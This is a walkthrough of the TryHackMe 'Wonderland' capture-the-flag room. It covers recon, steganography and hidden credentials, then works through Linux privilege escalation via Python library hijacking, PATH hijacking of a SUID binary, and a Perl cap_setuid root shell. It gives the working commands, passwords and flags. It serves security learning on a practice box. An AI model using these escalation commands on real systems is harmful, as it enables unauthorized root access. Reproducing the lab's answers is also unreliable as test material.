# Wonderland — TryHackMe Writeup

> **Platform:** TryHackMe  
> **Difficulty:** Medium  
> **OS:** Linux (Ubuntu 18.04)  
> **Techniques:** Steganography, Python Library Hijacking, PATH Hijacking, Linux Capabilities Exploitation  
> **Tags:** `web` `steganography` `privesc` `python-hijack` `path-hijack` `capabilities`

---

## Overview

Wonderland is an Alice in Wonderland-themed CTF room where everything is turned upside down — `user.txt` is in `/root/` and `root.txt` is in `/home/alice/`. The attack chain involves steganography to find hidden credentials, SSH access, and a triple privilege escalation through three different users: **alice → rabbit → hatter → root**.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -T4 -oN nmap_quick.txt 10.145.165.39
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Key findings:**
- SSH on port 22 — potential entry point once we have credentials
- HTTP on port 80 — Go-based web server with a suggestive title: *"Follow the white rabbit."*
- Ubuntu 18.04 (identified by OpenSSH package version `4ubuntu0.3`)

### Web Enumeration

#### Inspecting the Main Page

```bash
curl -v http://10.145.165.39/
```

```html
<!DOCTYPE html>
<head>
    <title>Follow the white rabbit.</title>
    <link rel="stylesheet" type="text/css" href="/main.css">
</head>
<body>
    <h1>Follow the White Rabbit.</h1>
    <p>"Curiouser and curiouser!" cried Alice...</p>
    <img src="/img/white_rabbit_1.jpg" style="height: 50rem;">
```

Notable findings:
- Alice in Wonderland theme confirmed
- CSS file at `/main.css` (clean, no hidden data)
- Image at `/img/white_rabbit_1.jpg` — potential steganography target
- `robots.txt` returns 404

#### Directory Listing in `/img/`

```bash
curl http://10.145.165.39/img/
```

```html
<pre>
<a href="alice_door.jpg">alice_door.jpg</a>
<a href="alice_door.png">alice_door.png</a>
<a href="white_rabbit_1.jpg">white_rabbit_1.jpg</a>
</pre>
```

Three images found. `alice_door` exists in both JPG and PNG formats — same dimensions (1962x1942), which hints at steganographic analysis or pixel-level comparison.

---

## Steganography

Downloaded all three images for analysis:

```bash
wget http://10.145.165.39/img/white_rabbit_1.jpg
wget http://10.145.165.39/img/alice_door.jpg
wget http://10.145.165.39/img/alice_door.png
```

### Steghide on white_rabbit_1.jpg

```bash
steghide extract -sf white_rabbit_1.jpg -p ""
```

```
wrote extracted data to "hint.txt".
```

```bash
cat hint.txt
```

```
follow the r a b b i t
```

The letters are spaced out: **r a b b i t** — this suggests a nested directory path `/r/a/b/b/i/t/` on the web server.

### Steghide on alice_door.jpg

```bash
steghide extract -sf alice_door.jpg -p ""
```

```
steghide: could not extract any data with that passphrase!
```

Data exists but is password-protected. We move on — this may be a rabbit hole.

---

## Following the White Rabbit

```bash
curl -L http://10.145.165.39/r/a/b/b/i/t/
```

> **Note:** The `-L` flag is important here — without it, curl stops at the 301 redirect and shows an empty body. Always check response codes with `curl -v` and follow redirects when needed.

```html
<!DOCTYPE html>
<head>
    <title>Enter wonderland</title>
</head>
<body>
    <h1>Open the door and enter wonderland</h1>
    <p>"Oh, you're sure to do that," said the Cat, "if you only walk long enough."</p>
    <p>Alice felt that this could not be denied, so she tried another question.
       "What sort of people live about here?"</p>
    <p>"In that direction," the Cat said, waving its right paw round, "lives a Hatter:
       and in that direction," waving the other paw, "lives a March Hare.
       Visit either you like: they're both mad."</p>
    <p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
    <img src="/img/alice_door.png" style="height: 50rem;">
```

Hidden in a `<p style="display: none;">` element:

```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

Credentials found! The password is a reference to a poem from *Alice's Adventures in Wonderland*.

---

## Initial Access — SSH as Alice

```bash
ssh alice@10.145.165.39
# Password: HowDothTheLittleCrocodileImproveHisShiningTail
```

```
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)
```

### Finding the Flags — The Twist

```bash
find / -name "root.txt" 2>/dev/null
# /home/alice/root.txt

cat /home/alice/root.txt
# Permission denied

cat /root/user.txt
# thm{"Curiouser and curiouser!"}
```

The room flips the expected flag locations:
- `user.txt` is in `/root/` (readable by alice)
- `root.txt` is in `/home/alice/` (only readable by root)

> **user.txt:** `thm{"Curiouser and curiouser!"}`

---

## Privilege Escalation: alice → rabbit

### Sudo Enumeration

```bash
sudo -l
```

```
User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Alice can run a specific Python script as user **rabbit**. The script imports the `random` module:

```python
import random
poem = """The sun was shining on the sea..."""
for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```

### Python Library Hijacking

When Python encounters `import random`, it searches for the module in the following order:

1. **Current directory** (the directory the script is in)
2. `PYTHONPATH` directories
3. Standard library paths

Since `walrus_and_the_carpenter.py` lives in `/home/alice/` (which we control), we can create a malicious `random.py` in the same directory that will be loaded instead of the real `random` module.

```bash
echo 'import os; os.system("/bin/bash")' > /home/alice/random.py
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

```bash
whoami
# rabbit
```

We now have a shell as **rabbit**.

---

## Privilege Escalation: rabbit → hatter

### Enumeration as Rabbit

```bash
ls -la /home/rabbit/
```

```
-rwsr-sr-x 1 root root 16816 May 25  2020 teaParty
```

A SUID binary owned by root. The `s` in permissions means it runs with the owner's (root's) privileges.

### Analyzing teaParty

```bash
cat /home/rabbit/teaParty | grep -a -i "date\|echo\|system\|bin\|sh"
```

```
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

The binary calls `date` **without a full path** (while `/bin/echo` uses the absolute path). This is vulnerable to **PATH hijacking**.

### PATH Hijacking

```bash
echo '#!/bin/bash' > /tmp/date
echo '/bin/bash' >> /tmp/date
chmod +x /tmp/date
export PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
./teaParty
```

When `teaParty` calls `date`, the system searches PATH left to right and finds our malicious `/tmp/date` first, which spawns a bash shell.

```bash
whoami
# hatter
```

### Hatter's Password

```bash
cat /home/hatter/password.txt
```

```
WhyIsARavenLikeAWritingDesk?
```

Another Alice in Wonderland reference — the Mad Hatter's famous riddle. This SSH password is needed for the final escalation step.

---

## Privilege Escalation: hatter → root

### Why We Need a Clean SSH Session

At this point, running `id` reveals a problem:

```
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```

Our GID is still **rabbit** (inherited from the teaParty chain). Perl's permissions are `-rwxr-xr--` with group `hatter`, so without the correct group membership, we fall into "others" (read-only, no execute). A fresh SSH login fixes this.

```bash
ssh hatter@10.145.165.39
# Password: WhyIsARavenLikeAWritingDesk?
```

### Linux Capabilities Exploitation

During earlier enumeration, we found:

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```

The `cap_setuid+ep` capability allows Perl to change the process UID — including changing it to 0 (root). This is a misconfiguration that grants any user who can execute Perl the ability to become root.

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash";'
```

```bash
whoami
# root

cat /home/alice/root.txt
```

> **root.txt:** `thm{Twinkle, twinkle, little bat! How I wonder what you're at!}`

---

## Full Attack Chain Summary

```
Recon (nmap) → Web Enum (curl) → Steganography (steghide) → Hidden Path (/r/a/b/b/i/t/)
  → Hidden Credentials (display:none) → SSH as alice
    → Python Library Hijacking (sudo -u rabbit) → shell as rabbit
      → PATH Hijacking (SUID teaParty) → shell as hatter
        → Linux Capabilities (perl cap_setuid) → root
```

```
alice ──[Python Library Hijack]──► rabbit ──[PATH Hijack]──► hatter ──[Perl cap_setuid]──► root
```

---

## Key Techniques & Lessons Learned

1. **Steganography (steghide):** Always check images in CTFs with `steghide`, `binwalk`, `strings`, `exiftool`, and `zsteg` (for PNG). Data hidden in pixel LSB is invisible to the naked eye.

2. **Hidden HTML Elements:** `style="display: none;"` hides content visually but not in source code. Always inspect page source — `curl` is more reliable than a browser for this.

3. **Python Library Hijacking:** Python resolves imports starting from the current directory. If you control the directory where a script runs, you can hijack any import by creating a same-named `.py` file.

4. **PATH Hijacking:** When a SUID binary calls external commands without absolute paths, you can create a malicious version in a directory you control and prepend it to PATH.

5. **Linux Capabilities (`cap_setuid`):** More granular than SUID but equally dangerous if misconfigured. Always check `getcap -r / 2>/dev/null` during enumeration. Reference: [GTFOBins — Capabilities](https://gtfobins.github.io/#+capabilities).

6. **GID Inheritance:** When pivoting through multiple users via process exploitation (not SSH), the group ID may not update. This can block access to group-restricted binaries. A clean SSH session resolves this.

7. **Inverted Flag Placement:** Don't assume flags are in standard locations. Enumerate thoroughly with `find / -name "*.txt" 2>/dev/null`.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning & service enumeration |
| curl | HTTP requests & header analysis |
| steghide | JPEG steganography extraction |
| exiftool | Image metadata analysis |
| binwalk | Binary file analysis & embedded file detection |
| ssh | Remote access |
| GTFOBins | Privilege escalation reference |
